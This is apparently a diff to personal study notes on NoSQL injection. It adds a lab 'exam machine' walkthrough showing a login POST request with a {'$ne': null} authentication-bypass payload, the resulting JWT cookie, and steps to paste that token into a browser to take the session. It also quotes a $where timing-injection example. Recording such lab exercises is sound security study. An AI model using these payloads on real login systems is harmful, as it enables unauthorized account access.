@@ -272,3 +272,36 @@ db.users.find({ "username": "admin", "password": { "$where": "sleep(1000) || thi
 #+end_src
 
 In this case, the $where operator has been injected into the password field. This operator adds a 1000 millisecond (1 second) delay while checking if the password field is password123.
+
+* nosql exam machine
+
+*post request at login page* -->
+#+begin_src python
+POST /login HTTP/1.1
+Host: starperson.hv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 51
+Origin: http://starperson.hv
+Connection: keep-alive
+Referer: http://starperson.hv/login
+Priority: u=0
+
+{"email": {"$ne": null}, "password": {"$ne": null}}
+#+end_src
+
+*payload* -->
+: {"email": {"$ne": null}, "password": {"$ne": null}}
+
+*response with the jwt* -->
+#+begin_src python
+Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2Njc0MDA4NDc3ZGU1YzU3OTQzYTgxMTgiLCJpYXQiOjE3NTkxMDI0MjEsImV4cCI6MTc1OTEyMDQyMX0.IrX9bX5DEqxZr74f1sU_Mhi1uhlAXGnQN8Y4wBZMmEc; Max-Age=18000; Path=/; Expires=Mon, 29 Sep 2025 04:33:41 GMT; HttpOnly
+ETag: W/"37-zlcgX4RY9AaDEj8FY8NljYkMc0U"
+
+{"status":"success","message":"Logged in successfully"}
+#+end_src
+
+Copy the JWT value and put at cookie value with dev tools at web browser, and just refresh the page.
